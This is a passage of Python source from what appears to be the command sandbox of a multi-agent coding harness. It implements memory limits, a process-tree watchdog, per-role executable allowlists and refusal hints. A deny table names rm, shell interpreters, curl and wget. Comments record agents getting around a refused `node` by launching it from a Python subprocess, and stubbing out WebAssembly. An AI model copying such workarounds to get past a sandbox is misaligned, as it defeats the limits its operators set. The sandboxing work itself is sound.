    # the image is shared by every run and costs a run nothing.
    _pw_cache = os.path.expanduser("~/.cache/ms-playwright")
    if not os.path.isdir(_pw_cache):
        _pw_cache = os.path.join(home, ".cache", "ms-playwright")
    if os.path.isdir(_pw_cache):
        environment["PLAYWRIGHT_BROWSERS_PATH"] = _pw_cache
    environment.update(TOOLCHAIN_ENVIRONMENT)
    # Before `extra_env`, so a caller can still override a specific value.
    environment.update(_concurrency_environment())
    # A port nothing is listening on, for a suite that starts the product
    # (the stack packs' acceptance configurations read it). Every command
    # gets one, so a suite an agent runs takes exactly the path the harness's
    # own runs take. Only the harness passed one before, and a defect that
    # broke every run but the harness's - a port picked twice - stayed
    # invisible to every check the harness made.
    environment["ACCEPTANCE_PORT"] = str(_a_free_port())
    environment.update(extra_env or {})
    return environment


def _a_free_port() -> int:
    """A port nothing on this machine is listening on right now."""
    import socket

    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 0))
        return probe.getsockname()[1]


def _apply_limits() -> None:
    """Cap the child before it execs. Runs between fork and exec.

    Nothing here can be relied on the way a container's cgroup can - these are
    per-process rlimits, and a command that forks can multiply its memory use -
    but they turn the common runaway (one process allocating without bound, or
    writing an unbounded file) from an outage into a killed command.
    """
    import resource

    # Its own process group, so a timeout can kill the whole tree rather than
    # just the process this module started.
    os.setsid()

    # RLIMIT_DATA, not RLIMIT_AS. `RLIMIT_AS` caps *address space*, and a modern
    # runtime reserves far more of that than it ever uses: V8 and WebAssembly
    # reserve multi-gigabyte contiguous ranges up front as a bounds-check trick
    # and touch almost none of it. Against a 2 GB address-space cap every WASM
    # instantiation fails - on one run, `WebAssembly.Instance(): Out of
    # memory: Cannot allocate Wasm memory for new instance` appeared 24 times,
    # the milestone review concluded "no test commands succeeded in the
    # workspace", and agents had started writing `WebAssembly = null` stubs to
    # work around a limit that was never about their memory use.
    #
    # `RLIMIT_DATA` bounds the heap that a runaway actually grows (and since
    # Linux 4.7 covers mmap'd data too), which is the thing worth bounding. The
    # container path sets a real cgroup limit besides; this is the backstop for
    # local execution, where there is no cgroup.
    memory_limit = getattr(resource, "RLIMIT_DATA", resource.RLIMIT_AS)
    for limit, value in (
        (memory_limit, _memory_limit_bytes()),
        (resource.RLIMIT_FSIZE, MAX_WRITE_BYTES),
    ):
        try:
            soft, hard = resource.getrlimit(limit)
            ceiling = value if hard == resource.RLIM_INFINITY else min(value, hard)
            resource.setrlimit(limit, (ceiling, hard))
        except (ValueError, OSError):
            # A limit this platform will not accept is not worth failing over.
            continue


class _TreeOverBudget(Exception):
    """A command's process tree was stopped for the memory it was using."""

    def __init__(self, used: int, budget: int, stdout: str, stderr: str) -> None:
        super().__init__("process tree over its memory budget")
        self.used_mb = used // 1024**2
        self.budget_mb = budget // 1024**2
        self.stdout = stdout
        self.stderr = stderr


#: How often a running command's process tree is measured.
_TREE_POLL_SECONDS = 0.5

#: The least a command's tree is ever allowed, whatever the container has free.
_LEAST_TREE_BUDGET_BYTES = 512 * 1024**2


def _tree_memory_bytes(group: int) -> int:
    """Resident memory of every process in process group `group`. Never raises.

    Read from `/proc`, where there is one: each `stat` carries the group id and
    `statm` the resident pages. Zero where it cannot be read, which makes the
    watch below a no-op rather than a failure.
    """
    total = 0
    try:
        page = os.sysconf("SC_PAGE_SIZE")
        for entry in os.listdir("/proc"):
            if not entry.isdigit():
                continue
            try:
                with open(f"/proc/{entry}/stat", encoding="utf-8", errors="replace") as handle:
                    # The command name is in brackets and may hold spaces; the
                    # fields after it are fixed. pgrp is the third of them.
                    after = handle.read().rsplit(")", 1)[-1].split()
                if int(after[2]) != group:
                    continue
                with open(f"/proc/{entry}/statm", encoding="utf-8") as handle:
                    total += int(handle.read().split()[1]) * page
            except (OSError, ValueError, IndexError):
                continue
    except (OSError, ValueError):
        return 0
    return total


def _tree_budget_bytes() -> int:
    """What one command's whole process tree may use, from what is free now."""
    ceiling = _memory_limit_bytes()
    try:
        from app.tools.resources import tree_budget

        return max(_LEAST_TREE_BUDGET_BYTES, tree_budget(ceiling))
    except Exception:  # noqa: BLE001 - then the configured ceiling stands
        return ceiling


def _kill_the_tree(group: int) -> None:
    try:
        os.killpg(group, signal.SIGKILL)
    except (OSError, ProcessLookupError):
        pass


def _run_and_watch_the_tree(
    argv: list[str], *, cwd: str, env: Dict[str, str], timeout: int
) -> "subprocess.CompletedProcess[str]":
    """`subprocess.run`, bounding the command's whole process tree.

    The rlimits in `_apply_limits` bound one process, and a command is rarely
    one process. Measured on one run: `npm test` started a runner with a worker
    per CPU, each within its own limit; together they took what the container
    had, the kernel killed the Celery worker instead of any of them, killed the
    two that replaced it, and the container restarted with the run still
    marked running.

    Two things change. The tree's resident memory is measured twice a second
    and the whole process group is killed when it passes what the container can
    give one command, raising `_TreeOverBudget` - a failed command with a
    reason, where there was a dead run with none. And a timeout kills the
    group, not only the process this module started: `subprocess.run` killed
    the direct child and left its workers running.
    """
    process = subprocess.Popen(  # noqa: S603 - argv list, no shell, validated by the caller
        argv,
        cwd=cwd,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        preexec_fn=_apply_limits,  # noqa: PLW1509 - the point is to limit the child
        start_new_session=False,   # _apply_limits calls setsid itself
    )
    budget = _tree_budget_bytes()
    over: list[int] = []
    finished = threading.Event()

    def watch() -> None:
        while not finished.wait(_TREE_POLL_SECONDS):
            used = _tree_memory_bytes(process.pid)
            if used > budget:
                over.append(used)
                _kill_the_tree(process.pid)
                return

    watcher = threading.Thread(target=watch, name="sandbox-tree-watch", daemon=True)
    watcher.start()
    try:
        stdout, stderr = process.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        _kill_the_tree(process.pid)
        stdout, stderr = process.communicate()
        raise subprocess.TimeoutExpired(argv, timeout, output=stdout, stderr=stderr) from None
    finally:
        finished.set()
        watcher.join(timeout=2)
        # Whatever the command left behind in its group goes with it.
        _kill_the_tree(process.pid)
    if over:
        raise _TreeOverBudget(over[0], budget, stdout or "", stderr or "")
    return subprocess.CompletedProcess(argv, process.returncode, stdout, stderr)


def _image_for(executable: str) -> str:
    if executable in {"npm", "npx", "node", "yarn", "pnpm"}:
        return os.environ.get("SANDBOX_NODE_IMAGE", "node:24-slim")
    if executable in {"python", "python3", "pip", "pip3", "pytest", "uv", "django-admin", "alembic"}:
        return os.environ.get("SANDBOX_PYTHON_IMAGE", "python:3.12-slim")
    if executable == "go":
        return os.environ.get("SANDBOX_GO_IMAGE", "golang:1.22")
    if executable == "cargo":
        return os.environ.get("SANDBOX_RUST_IMAGE", "rust:1-slim")
    return os.environ.get("SANDBOX_BASE_IMAGE", "debian:12-slim")


#: Package-manager subcommands that create or rewrite a project manifest.
_MANIFEST_WRITING_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "npm": frozenset({"init", "install", "i", "add", "create"}),
    "yarn": frozenset({"init", "add", "install"}),
    "pnpm": frozenset({"init", "add", "install"}),
    "npx": frozenset({"create-react-app", "create-next-app", "create-vite"}),
}

#: Flags that aim a package manager at a directory other than where it runs.
_PREFIX_FLAGS = ("--prefix", "--cwd", "--dir", "-C")


def the_project_this_command_belongs_in(command: Sequence[str], repo_root: str) -> str | None:
    """The pinned project directory this manifest command should run in.

    None when the command does not write a manifest, when no project is pinned,
    or when the command already aims itself somewhere with `--prefix`.

    Split out from the message below so the caller can act on the answer
    instead of only reporting it. See `manifest_written_outside_the_project`.
    """
    if not command:
        return None
    from app.tools.repository import pinned_project_directory

    executable = Path(str(command[0])).name
    subcommands = _MANIFEST_WRITING_SUBCOMMANDS.get(executable)
    if not subcommands:
        return None
    arguments = [str(part) for part in command[1:]]
    if not any(argument in subcommands for argument in arguments):
        return None
    if any(argument.startswith(_PREFIX_FLAGS) for argument in arguments):
        return None

    try:
        pinned = pinned_project_directory(Path(repo_root))
    except Exception:  # noqa: BLE001 - a guard must not fail the command it guards
        return None
    return str(pinned) if pinned else None


def manifest_written_outside_the_project(command: Sequence[str], repo_root: str) -> str | None:
    """Why this command would scaffold beside the project, or None if it would not.

    Commands always run with the workspace root as their working directory, so
    `npm install` there creates `package.json` and `node_modules` at the root -
    beside a project that already has its own. The two then disagree about
    dependency versions and test configuration, which on one run meant jest
    30 at the root running the project's jest-29 tests and three remediation
    rounds spent on "Identifier 'jest' has already been declared".

    `write_artifact` already refuses a root manifest once a project is pinned,
    but a package manager reaches the same file through a different door.

    Only fires when a project is actually pinned, and passing `--prefix` (or
    equivalent) is taken as knowing where you are aiming.
    """
    pinned = the_project_this_command_belongs_in(command, repo_root)
    if not pinned:
        return None
    executable = Path(str(command[0])).name
    arguments = [str(part) for part in command[1:]]
    return (
        f"'{' '.join([executable, *arguments[:2]])}' would create or rewrite a project "
        f"manifest at the workspace root, and this run's project is '{pinned}'. Two "
        "manifests disagree about dependency versions and test configuration, and the "
        f"tests then run under the wrong one. Use --prefix {pinned} (or run the "
        f"equivalent command against '{pinned}/') instead."
    )


class WorkingDirectoryRejected(Exception):
    """The requested working directory is not a directory inside the workspace."""


def resolve_working_directory(workspace: str, working_directory: str | None) -> str:
    """The absolute directory a command should run in, always inside `workspace`.

    There is no shell, so an agent cannot `cd`. Without this parameter the only
    way to act on a subdirectory was a tool that happens to take one - `npm`
    has `--prefix`, `npx` and a shell script have nothing - and every role that
    tried `cd todo-app && npx jest` was refused with no alternative to fall
    back on.

    Measured on one run: eight commands were spent discovering `--prefix`,
    and `./scripts/line_count_check.sh` inside the project was never runnable
    at all. Four of the refusals were `cd`, one was `bash -lc`; putting either
    on the allowlist would hand back the shell this sandbox exists to withhold.
    """
    root = Path(workspace).resolve()
    if not working_directory:
        return str(root)

    candidate = Path(working_directory)
    if candidate.is_absolute():
        # Two different things arrive here wearing the same leading slash.
        #
        # One is the workspace's own absolute path, which agents read out of
        # tool results. The other is `/project-name`, which is how every role
        # is taught to address the workspace root - the read tools, the write
        # tool and the prompt all use it - and which means the subdirectory,
        # not a path at the filesystem root.
        #
        # Only the first was accepted. On one run the UI specialist ran
        # its verifier with `working_directory="/simple-to-do-list-app"`, was
        # told the directory it was standing in was "outside the workspace",
        # and had to retry - a gate spent on a convention this codebase itself
        # taught it.
        try:
            resolved = candidate.resolve()
        except OSError as exc:
            raise WorkingDirectoryRejected(
                f"'{working_directory}' is not inside the workspace."
            ) from exc
        if resolved == root or root in resolved.parents:
            candidate = Path(os.path.relpath(resolved, root))
        else:
            candidate = Path(str(candidate).lstrip("/"))

    target = (root / candidate).resolve()
    if target != root and root not in target.parents:
        raise WorkingDirectoryRejected(
            f"'{working_directory}' is outside the workspace. Give a path relative to "
            "the workspace root, such as the project directory's name."
        )
    if not target.is_dir():
        raise WorkingDirectoryRejected(
            f"'{working_directory}' is not a directory in this workspace."
        )
    return str(target)


def workspace_rooted_arguments(
    argv: list[str], workspace: str, run_in: str
) -> list[str]:
    """Read `/project/file` in a command argument the way every other tool does.

    `ls`, `read_file`, `glob`, `write_artifact` and `working_directory` all take
    a leading slash to mean the workspace root, and the prompt teaches it. A
    command argument was the one place that did not: the command runs in a
    container where `/` is the container's own root, so `/todo-app/index.html`
    named nothing.

    Measured on one run: the documentation specialist ran
    `wc -l /simple-to-do-list-app/index.html`, got "No such file", and spent six
    approval gates on `pwd`, `ls /`, `find` and two more `wc` spellings working
    out a convention it had been taught correctly everywhere else.

    Deliberately narrow. An argument is rewritten only when all three hold: it
    is absolute, nothing is at that path, and something *is* at the same path
    inside the workspace. So a regex, a URL, a compiler flag and a real absolute
    path are all left exactly as they are - there is no reading of them under
    which the rewrite would fire.

    The replacement is relative to the directory the command will run in, which
    is correct whether the workspace is mounted at `/workspace` in a sandbox
    container or used in place.
    """
    rewritten = list(argv)
    for index, argument in enumerate(rewritten[1:], start=1):
        if not argument.startswith("/") or argument == "/":
            continue
        if os.path.exists(argument):
            continue
        candidate = os.path.join(workspace, argument.lstrip("/"))
        # `commonpath` rather than `startswith`: the argument may contain `..`.
        try:
            resolved = os.path.realpath(candidate)
            if os.path.commonpath([resolved, workspace]) != workspace:
                continue
        except ValueError:  # different drives; cannot be inside
            continue
        # The path itself, or - for a path being created - its parent. A
        # `mkdir` target does not exist yet by definition, so requiring the
        # path itself to be there excluded exactly the case that needs this.
        # Measured on one run: the testing specialist spent five gates on
        # `mkdir -p /simple-to-do-list-app/tests`, `mkdir -p /tests`, `ls`,
        # `pwd` and finally a relative path - and put the tests in the wrong
        # directory as a result.
        #
        # The parent still has to exist inside the workspace, so this stays
        # narrow: `/nothing-here/x` and a regex like `/foo/` have no parent
        # here and are left alone.
        if not os.path.exists(candidate) and not os.path.isdir(os.path.dirname(candidate)):
            continue
        rewritten[index] = os.path.relpath(candidate, run_in)
    return rewritten


STACK_MARKER = ".project-stack"
"""Where a run records the toolchain it chose, beside `.project-directory`.

The allowlist cannot ask the stack selector directly - the sandbox is handed a
role name and a workspace, not the run's state - so the decision is pinned to
the workspace the way the project directory already is.
"""

#: Executables a language needs to run its own code, by the name the stack
#: selector uses for it. Runtime, package manager and test runner together,
#: because a role that can write a file in a language and not run it has only
#: bad options - and takes them.
#:
#: One run: the database specialist wrote app.js, app.test.mjs and a
#: package.json, was refused `node`, wrote a Python script to subprocess-launch
#: node (permitted), then tried `python3 app.test.mjs` and finally to `exec()` a
#: JavaScript module as Python. That was the fourth time `node` was added to one
#: role at a time. A table keyed by language is what stops there being a fifth.
TOOLCHAINS: dict[str, frozenset[str]] = {
    # `playwright` is here because `TESTABILITY_RULE` makes it mandatory for
    # frontend UI code and the Dockerfile installs Chromium's system libraries
    # for it. It was on no role's allowlist, so the runner the harness orders
    # the model to use was one nothing could name: `_must_be_runnable` derives
    # its set of real runners from these tables, and rejected "headless
    # browser testing with Playwright" for a runner it had never heard of.
    # `npx playwright test` worked only because `npx` runs anything, which is
    # the accident that hid four earlier allowlist gaps.
    "javascript": frozenset({"node", "npm", "npx", "yarn", "pnpm", "jest", "vitest", "mocha", "tsc", "playwright"}),
    "typescript": frozenset({"node", "npm", "npx", "yarn", "pnpm", "jest", "vitest", "mocha", "tsc", "ts-node", "playwright"}),
    "python": frozenset({"python", "python3", "pip", "pip3", "pytest", "uv", "poetry", "ruff"}),
    "go": frozenset({"go", "gofmt", "gotestsum"}),
    "rust": frozenset({"cargo", "rustc", "rustfmt"}),
    "java": frozenset({"java", "javac", "mvn", "gradle"}),
    "kotlin": frozenset({"kotlin", "kotlinc", "gradle"}),
    "csharp": frozenset({"dotnet"}),
    "ruby": frozenset({"ruby", "bundle", "gem", "rake", "rspec"}),
    "php": frozenset({"php", "composer", "phpunit"}),
    "swift": frozenset({"swift", "swiftc"}),
    "dart": frozenset({"dart", "flutter"}),
    "elixir": frozenset({"elixir", "mix"}),
    # Added 2026-09-19 alongside the timeout scales. A language the scale
    # table named and this table did not could never be pinned, so its scale
    # could never apply - the completeness test now pins both directions.
    "scala": frozenset({"scala", "scalac", "sbt", "mill", "gradle"}),
    "c": frozenset({"gcc", "clang", "make", "cmake"}),
    "cpp": frozenset({"g++", "clang++", "make", "cmake"}),
}

#: Spellings the stack selector actually produces, mapped to a table key.
_LANGUAGE_ALIASES = {
    "js": "javascript", "node": "javascript", "nodejs": "javascript",
    "node.js": "javascript", "vanilla javascript": "javascript",
    "es6": "javascript", "ecmascript": "javascript",
    "ts": "typescript",
    "py": "python", "python3": "python",
    "golang": "go",
    "c#": "csharp", "c sharp": "csharp", "dotnet": "csharp", ".net": "csharp",
    "rb": "ruby",
}


def _toolchain_key(language: str) -> str | None:
    """The table key for a language name as a model wrote it.

    Scanned, not parsed from the front. Taking the leading word handled
    "JavaScript (ES6+)", "Python 3.12" and "Go 1.22", and failed on anything
    with a qualifier in front of the name.

    Measured live on one run, whose stack selector answered "Plain
    JavaScript (ES6+)": the head word was `plain`, nothing matched, and
    `.project-stack` was written empty. Every role then lost the JavaScript
    toolchain, so `tsc`, `vitest` and `playwright` were on no allowlist - in a
    run whose own test suite is Playwright. `node` and `npm` survived only
    because two roles hard-code them, which is the accident this table exists
    to stop relying on.

    Longest match first, so "javascript" is preferred over the "java" inside
    it. On word boundaries, so "javascripty" is not JavaScript and a sentence
    mentioning Go in passing does not pin Go unless it stands as a word.
    """
    text = (language or "").strip().lower()
    if not text:
        return None
    if text in TOOLCHAINS:
        return text
    if text in _LANGUAGE_ALIASES:
        return _LANGUAGE_ALIASES[text]

    # Every name that could appear, longest first. `c` and `go` are real keys
    # and also common English words, so they are matched only as whole words -
    # which the boundary below already enforces.
    candidates = sorted(
        set(TOOLCHAINS) | set(_LANGUAGE_ALIASES), key=len, reverse=True
    )
    for name in candidates:
        if re.search(rf"(?<![\w#.+]){re.escape(name)}(?![\w#+])", text):
            return TOOLCHAINS.get(name) and name or _LANGUAGE_ALIASES.get(name)
    return None


#: The language a framework is written in, for the fields that name a
#: framework instead of a language.
#:
#: `TechnologyStack` carries `language` AND `frontend_framework`, and the stack
#: selector's prompt requires both filled for a product with a separate
#: frontend. Only `language` ever reached the sandbox, so a Go-backend /
#: TypeScript-frontend product pinned `go` and every code-writing role got
#: Go's toolchain and no `tsc`. It had not bitten yet only because
#: `ROLE_EXECUTABLES["ui_ux_specialist"]` hard-codes the JavaScript set - the
#: same accident that hid four earlier allowlist gaps, and it disappears the
#: moment a frontend is not JavaScript.
#:
#: A full-stack product is the normal case, not the exception, so the pin
#: holds a set.
FRAMEWORK_LANGUAGES: dict[str, str] = {
    # JavaScript and TypeScript frontends.
    "react": "typescript", "next": "typescript", "next.js": "typescript",
    "vue": "typescript", "nuxt": "typescript", "svelte": "typescript",
    "sveltekit": "typescript", "angular": "typescript", "solid": "typescript",
    "preact": "typescript", "astro": "typescript", "remix": "typescript",
    "ember": "javascript", "jquery": "javascript", "htmx": "javascript",
    "vanilla": "javascript", "vite": "typescript", "express": "javascript",
    "nest": "typescript", "nestjs": "typescript", "fastify": "javascript",
    "electron": "typescript",
    # Backends whose framework name does not contain the language.
    "django": "python", "flask": "python", "fastapi": "python",
    "rails": "ruby", "sinatra": "ruby", "hanami": "ruby",
    "laravel": "php", "symfony": "php", "slim": "php",
    "spring": "java", "spring boot": "java", "quarkus": "java", "micronaut": "java",
    "ktor": "kotlin",
    "gin": "go", "echo": "go", "fiber": "go", "chi": "go",
    "actix": "rust", "axum": "rust", "rocket": "rust",
    "phoenix": "elixir",
    "asp.net": "csharp", "aspnet": "csharp", "blazor": "csharp",
    "flutter": "dart",
    "swiftui": "swift", "vapor": "swift",
}


def _toolchain_keys(*names: str) -> set[str]:
    """Every toolchain these language or framework names imply.

    Takes both, because the stack records a language for the backend and a
    framework for the frontend and a run needs the tools for both. A name that
    maps to nothing is skipped rather than failing the pin.
    """
    keys: set[str] = set()
    for name in names:
        text = str(name or "").strip().lower()
        if not text:
            continue
        key = _toolchain_key(text)
        if key is None:
            # Not a language. It may still be a framework whose language is
            # known - "React" implies TypeScript tooling, "Rails" implies Ruby.
            key = FRAMEWORK_LANGUAGES.get(text)
            if key is None:
                # "Spring Boot 3", "React 19" - take the leading words.
                for candidate in (" ".join(text.split()[:2]), text.split()[0] if text.split() else ""):
                    if candidate in FRAMEWORK_LANGUAGES:
                        key = FRAMEWORK_LANGUAGES[candidate]
                        break
        if key:
            keys.add(key)
    return keys


def pin_project_stack(repo_root: str | Path, *languages: str) -> None:
    """Record every language this run builds in. Never raises.

    Variadic, and callers should pass the whole stack: the backend language,
    the frontend framework, and anything else that implies a toolchain. One
    key per line, so a file written by the previous single-language version
    still reads correctly.
    """
    keys = _toolchain_keys(*languages)
    if not keys:
        logger.info(
            "No toolchain known for %r; roles keep their defaults", list(languages)
        )
        return
    try:
        (Path(repo_root) / STACK_MARKER).write_text(
            "\n".join(sorted(keys)) + "\n", encoding="utf-8"
        )
    except OSError:
        logger.debug("Could not pin the project stack", exc_info=True)


def project_stack(repo_root: str | Path | None) -> frozenset[str]:
    """Every toolchain pinned for this run. Never raises; empty when unpinned.

    Returns a set rather than one key. A marker file written before this was
    a set holds a single line, which reads back as a one-element set, so no
    migration is needed.
    """
    if not repo_root:
        return frozenset()
    try:
        text = (Path(repo_root) / STACK_MARKER).read_text(encoding="utf-8")
    except OSError:
        return frozenset()
    return frozenset(line.strip() for line in text.splitlines() if line.strip())


#: What to do instead, for the commands a model reaches for that this
#: environment will never allow. The allowlist tells it what it may run; that
#: is not the same as telling it how to do the thing it was trying to do, and a
#: model handed a list of twenty-six programs reads it as "pick another one"
#: rather than "use a different tool".
#:
#: Measured on one run: `sh ./simple-to-do-list-app/build.sh` refused five
#: times, `rm -rf simple-to-do-list-app/tests` once. Both had an obvious answer
#: the refusal did not mention - `delete_artifact` exists, and a build script's
#: commands can simply be run.
_INSTEAD_OF: dict[str, str] = {
    "rm": "To remove a file, use the `delete_artifact` tool, which records what it removed.",
    "rmdir": "To remove a file, use the `delete_artifact` tool, which records what it removed.",
    "mv": "To move or rename a file, use the `move_artifact` tool.",
    "cp": "To copy a file, read it with `read_file` and write the copy with `write_artifact`.",
    "sh": (
        "There is no shell here, so a script cannot be executed. Run the "
        "commands inside it directly, one `run_terminal_command` per command, "
        "or put them in a package.json script and run `npm run <name>`."
    ),
    "bash": (
        "There is no shell here, so a script cannot be executed. Run the "
        "commands inside it directly, one `run_terminal_command` per command, "
        "or put them in a package.json script and run `npm run <name>`."
    ),
    "zsh": (
        "There is no shell here, so a script cannot be executed. Run the "
        "commands inside it directly, one `run_terminal_command` per command, "
        "or put them in a package.json script and run `npm run <name>`."
    ),
    "sed": "To change a file, use `edit_artifact`, which matches an exact passage.",
    "awk": "To read a file, use `read_file`; to change one, use `edit_artifact`.",
    "cd": (
        "`cd` is not a program. Pass `working_directory` to "
        "`run_terminal_command` to run somewhere else."
    ),
    # Accurate rather than absolute: `NETWORK_CATEGORIES` grants a network to
    # the `install` category, which is how `npm install jsdom` succeeds. What is
    # unavailable is fetching something by hand.
    "curl": (
        "Only dependency installs reach the network, and only through the "
        "package manager: run `npm install <package>` or `pip install "
        "<package>` with category 'install'. Nothing else can fetch a URL."
    ),
    "wget": (
        "Only dependency installs reach the network, and only through the "
        "package manager: run `npm install <package>` or `pip install "
        "<package>` with category 'install'. Nothing else can fetch a URL."
    ),
}


def _what_to_do_instead(executable: str) -> str:
    """The tool that does what this refused command was trying to do, or "".

    A script invoked by path - `./build.sh`, `scripts/setup.sh` - is refused by
    the allowlist like any other unknown program, and the refusal used to name
    only the programs that are permitted. The agent's next move is then to try
    `sh ./build.sh`, which is refused again for a different reason. Both are
    the same mistake and both have the same answer, so a `.sh` basename gets
    the answer already written for `sh`.

    The check is on the name, not on the file: a name ending in `.sh` that is
    on no allowlist is a script whichever way it was reached, and a name that
    *is* permitted never arrives here.
    """
    if executable.endswith(".sh"):
        return f" {_INSTEAD_OF['sh']}"
    suggestion = _INSTEAD_OF.get(executable)
    return f" {suggestion}" if suggestion else ""


def _installed(names: frozenset[str] | set[str]) -> tuple[list[str], list[str]]:
    """Split allowed executables into those on PATH now, and the rest.

    The allowlist is the security boundary and is not narrowed by this - a
    command is refused or permitted exactly as before. What changes is the
    sentence the refusal prints, which used to name sixteen programs the
    execution image does not have.

    Measured against the deployed worker image: of 34 names across all roles,
    `alembic cargo go jasmine jest karma make mocha pnpm prisma psql pytest
    tsc uv vitest yarn` were absent. `make` is the one this harness itself
    recommends, in the refusal that explains there is no shell. A specialist
    told "Allowed: ... make ..." tries it, is told "not found", and has been
    handed an environment fault it cannot fix - which is the shape that turned
    one run into five identical `sh` attempts and then a blocker loop.

    Re-evaluated on every refusal rather than cached, because `pip install
    pytest` and `npm install -D vitest` genuinely move a name from the second
    list to the first mid-run.
    """
    present, absent = [], []
    for name in sorted(names):
        (present if shutil.which(name) else absent).append(name)
    return present, absent


def _what_can_actually_run(permitted: frozenset[str] | set[str]) -> str:
    """The "Allowed:" sentence, telling apart what runs from what must be installed."""
    present, absent = _installed(permitted)
    if not absent:
        return f"Allowed: {', '.join(present)}."
    return (
        f"Allowed and installed: {', '.join(present) or '(none)'}. "
        f"Also allowed but NOT installed, so they fail until something puts "
        f"them on PATH - `npx <tool>` runs a node package without installing "
        f"it, `npm install -D <tool>` or `pip install <tool>` installs one: "
        f"{', '.join(absent)}."
    )


def allowed_executables(
    role_name: str, repo_root: str | Path | None = None
) -> frozenset[str]:
    """Executables this role may run.

    An unknown role gets only the common set. The previous code did the
    opposite - it *widened* the allowlist for unrecognised roles - so a typo in a
    role name granted more access, not less.

    Every role that writes code also gets the toolchain of the language this
    run chose. The static table was right for the stacks it listed and silently
    wrong for the rest: `go` and `cargo` appeared under one role, and `dotnet`,
    `mvn`, `ruby`, `php`, `swift` and `dart` under none, so a product in any of
    those languages could be written and never run. Reviewers, which do not
    write code, are unchanged.
    """
    base = ROLE_EXECUTABLES.get(role_name, frozenset()) | COMMON_EXECUTABLES
    if role_name not in ROLE_EXECUTABLES:
        return base
    keys = project_stack(repo_root)
    if not keys:
        return base
    for key in keys:
        base = base | TOOLCHAINS.get(key, frozenset())
    return base


#: A quoted literal inside a code snippet. The snippet is not parsed - every
#: language quotes a path the same way, and a path is all this needs.
#:
#: One character up, not two: a minimum of two makes a one-character literal
#: unmatchable, so the scan slides past its quotes and swallows the next
#: literal with them. `open(F, '<', 'app.js')` yielded `', '` and no path.
_A_QUOTED_LITERAL = re.compile(r"""['"]([^'"\n]{1,200})['"]""")

#: A literal that could be a path: a short extension, optionally with
#: directories before it. `utf8`, `Exports:` and `, ` are none of those.
_COULD_BE_A_PATH = re.compile(r"^[\w./@+-]*[\w-]\.[A-Za-z0-9]{1,6}$")

#: How many files one note names. Past a couple the snippet was doing something
#: else and this is guessing.
MAX_FILES_A_SNIPPET_NAMED = 3


def _what_that_snippet_was_reading(argv: Sequence[str], repo_root: str | Path | None) -> str:
    """The workspace files an inline snippet names, or "".

    A snippet refused for executing arbitrary code is told to "put the code in
    a file inside the project folder, run the file, then remove it" - three
    calls, and a scratch file written into the product. Across the current
    generation of runs that refusal fired 31 times in 10 of 24 runs, and almost
    every snippet was reading a file and printing part of it:

        node -e "const pkg = JSON.parse(require('fs').readFileSync('todo-app/package.json','utf8')); ..."
        node -e "const css = fs.readFileSync('/simple-to-do-list-app/style.css', 'utf8'); ..."
        node -e "import('./todo-app/app.js').then(m => console.log(Object.keys(m)))"

    Most of those need to execute nothing: `read_file` returns the file and
    `grep` finds a name inside it. Some do - a snippet that requires the module
    and exercises it against a mock is not reading - so the note offers the
    cheaper route rather than asserting the snippet only reads, and repeats that
    the file-then-delete route is there for one that really must run.

    The refusal stands either way. What a snippet can do is why it is refused,
    and that does not depend on what this one happened to be for; only the
    advice after it changes.

    Reads quoted literals rather than any language's syntax, so it is not about
    any one runtime: `node -e`, `python -c`, `ruby -e`, `php -r` and `perl -e`
    all quote a path the same way, and the workspace decides whether it is one.

    Never raises, and says nothing unless it can name a file that exists.
    """
    if not repo_root:
        return ""
    try:
        root = os.path.abspath(str(repo_root))
        wanted: list[str] = []
        for part in argv[1:]:
            for literal in _A_QUOTED_LITERAL.findall(str(part)):
                candidate = literal.strip()
                if not _COULD_BE_A_PATH.match(candidate):
                    continue
                if candidate not in wanted:
                    wanted.append(candidate)
        if not wanted:
            return ""

        found: list[str] = []
        for name in wanted:
            direct = os.path.join(root, name.lstrip("./"))
            if os.path.isfile(direct):
                relative = os.path.relpath(direct, root)
                if relative not in found:
                    found.append(relative)
        if len(found) < len(wanted):
            # One pruned walk for whatever a direct join did not settle, which
            # is how `./app.mjs` inside a project folder is found at all.
            basenames = {os.path.basename(name) for name in wanted}
            for directory, subdirectories, files in os.walk(root):
                subdirectories[:] = [
                    entry for entry in subdirectories
                    if entry not in IGNORED_DIRECTORIES
                    and entry not in _RUNNER_OUTPUT_DIRECTORIES
                ]
                for entry in files:
                    if entry not in basenames:
                        continue
                    relative = os.path.relpath(os.path.join(directory, entry), root)
                    if relative not in found:
                        found.append(relative)
                if len(found) >= MAX_FILES_A_SNIPPET_NAMED:
                    break
    except Exception:  # noqa: BLE001 - a hint must never change a refusal
        return ""

    if not found:
        return ""
    shown = sorted(found)[:MAX_FILES_A_SNIPPET_NAMED]
    named = ", ".join(f"`{name}`" for name in shown)
    it = "it" if len(shown) == 1 else "them"
    # Offered, not asserted. Some of these snippets require the module and
    # exercise it, which is not reading, and a note that told them otherwise
    # would be wrong about the one thing it is for.
    return (
        f" Before you do: this snippet names {named}, already in the workspace. "
        f"If what you need is what is in {it}, `read_file` returns that without "
        "running anything and `grep` finds a name inside without reading all of "
        f"{it} - one call rather than three, and nothing left to delete. If you "
        "do need to execute it, the route above is the way."
    )


def _what_to_do_with_that_argument(
    executable: str,
    argv: Sequence[str],
    repo_root: str | Path | None,
    permitted: frozenset[str] | set[str],
) -> str:
    """Why this argument is refused and what to send instead.

    One sentence used to cover every entry in `_FORBIDDEN_ARGS`: "it can
    execute arbitrary code. Put the code in a file inside the project folder,
    run the file, then remove it with `delete_artifact`." That is exactly right
    for `ruby -e` and wrong for the other three shapes the table holds.
    `npm exec -- sh` has no code to put in a file, and `gradle -b other.gradle`
    has no snippet either. An agent handed the file-and-delete route for those
    writes a file it did not need, and the refusal it gets for the next attempt
    looks identical, so nothing tells it the advice never applied.
    """
    kind = _WHY_THE_ARGUMENT_IS_REFUSED.get(executable, "eval")
    if kind == "any_program":
        return (
            "it runs a program the allowlist has not cleared, so it is refused "
            "whatever follows it. There is nothing to put in a file: run the "
            "program directly as the first item of `command`, and it is checked "
            f"on its own name. {_what_can_actually_run(permitted)}"
        )
    if kind == "foreign_build_file":
        return (
            "the build has to come from the project's own build file. This "
            "either points it at a different file or supplies a rule on the "
            "command line, and neither is reproducible for the next stage. Put "
            "the step in the build file the project already has, then run the "
            "target by name."
        )
    if kind == "reconfigures_the_tool":
        return (
